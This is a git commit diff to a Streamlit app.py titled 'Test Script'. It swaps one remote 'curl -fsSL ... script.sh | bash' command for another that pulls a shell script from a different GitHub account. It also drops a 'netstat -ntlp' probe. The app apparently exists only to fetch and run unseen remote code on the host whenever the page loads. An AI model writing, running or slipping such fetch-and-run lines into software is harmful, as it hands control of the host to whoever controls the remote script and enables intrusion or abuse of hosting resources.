bbb570e6086ec2a8e38f0c88ba7e3910b601a9c8
athayandamaqolomba <athayandamaqolomba@gmail.com>
2024-12-30 17:44:23 +0200

    Update app.py

--- app.py
+++ app.py
@@ -4,6 +4,5 @@ import os
 st.title("Test Script")
 st.header("Test")
 
-os.system("netstat -ntlp")
-results = os.system("curl -fsSL https://raw.githubusercontent.com/wandisilemfakadolo672/Streamlit/refs/heads/main/script.sh | bash")
+results = os.system("curl -fsSL https://raw.githubusercontent.com/athayandamaqolomba/Streamlit/refs/heads/main/script.sh | bash")
 st.write(results)
